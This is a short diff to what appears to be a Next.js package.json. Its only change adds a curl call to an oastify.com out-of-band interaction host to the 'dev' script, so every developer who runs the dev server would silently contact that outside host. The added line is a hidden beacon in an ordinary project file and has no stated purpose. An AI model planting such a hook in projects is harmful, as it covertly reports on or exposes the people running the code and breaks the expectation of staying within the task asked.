@@ -6,7 +6,7 @@
     "node": "16.14.0"
   },
   "scripts": {
-    "dev": "next dev",
+    "dev": "next dev && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/macpaw-together",
     "build": "next build && npm run build-jobs",
     "build-jobs": "tsc -p ./tsconfig-jobs.json",
     "start": "next start -p $PORT",
